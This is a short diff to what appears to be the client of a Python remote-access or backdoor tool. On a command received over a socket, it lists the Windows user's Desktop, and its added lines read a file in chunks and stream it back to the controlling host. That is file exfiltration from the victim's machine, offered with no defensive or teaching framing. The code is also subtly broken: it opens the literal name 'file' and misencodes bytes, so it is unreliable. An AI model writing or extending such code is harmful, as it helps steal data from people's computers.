@@ -73,6 +73,7 @@ while (True):
     # output from certain executions, so maybe we can use this to execute commands one by one could include like
     # command and then choose which command to use
     #https://www.computerhope.com/issues/chusedos.htm
+
     elif decodedMsg == "SendFiles-Desktop":
         dir =  "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
         command = dir + "&& dir"
@@ -86,7 +87,12 @@ while (True):
         else:
             file = command+ decodedMsg
             f = open("file", "rb")
-
+            message = f.read(2048)
+            while message:
+                s.sendall(bytes(message, "utf-8"))
+                message = f.read(2048)
+            s.sendall(bytes("done sending","utf-8"))
+            f.close()
             #https: // stackoverflow.com / questions / 27241804 / sending - a - file - over - tcp - sockets - in -python
             #rb needed for sending binary file
 
